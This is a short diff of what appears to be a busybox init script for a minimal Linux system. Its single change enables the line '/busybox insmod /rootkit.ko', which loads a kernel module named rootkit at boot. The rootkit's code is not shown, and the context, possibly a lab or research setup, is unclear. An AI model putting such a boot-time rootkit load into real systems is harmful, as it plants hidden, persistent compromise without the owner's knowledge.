@@ -13,7 +13,7 @@
 /busybox mdev -s
 /busybox mount -o noatime /dev/sda2 /mnt
 
-#/busybox insmod /rootkit.ko
+/busybox insmod /rootkit.ko
 
 /busybox umount /mnt
 #/busybox umount /proc
